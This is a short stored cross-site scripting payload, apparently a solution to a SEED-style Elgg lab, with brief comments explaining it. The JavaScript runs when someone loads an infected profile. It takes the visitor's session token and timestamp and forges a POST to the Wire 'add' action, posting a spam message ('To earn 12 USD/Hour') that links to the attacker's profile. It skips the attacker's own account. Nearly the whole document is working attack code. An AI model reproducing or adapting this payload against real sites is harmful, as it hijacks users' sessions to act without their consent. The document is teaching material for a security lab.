//Inspected the url for posting in wire
//Found the way of sending the content which consists of token+ts+body
//Added the link of samy's profile in the content
//Followed the checking of user.guid to prevent posting on own's profile
//When Samy uploads this code on this profile,anyone visiting his profile would have the post posted on wire
<script type="text/javascript">
	window.onload = function(){
		var guid = "&guid=" + elgg.session.user.guid;
		var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token = "&__elgg_token="+elgg.security.token.__elgg_token;
		var body="&body=To earn 12 USD/Hour(!), visit now: ";
        var link="http://www.xsslabelgg.com/profile/samy"
		var sendurl = "http://www.xsslabelgg.com/action/thewire/add";
		var content = token+ts+body+link
		if(elgg.session.user.guid != 47)
		{
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}
</script>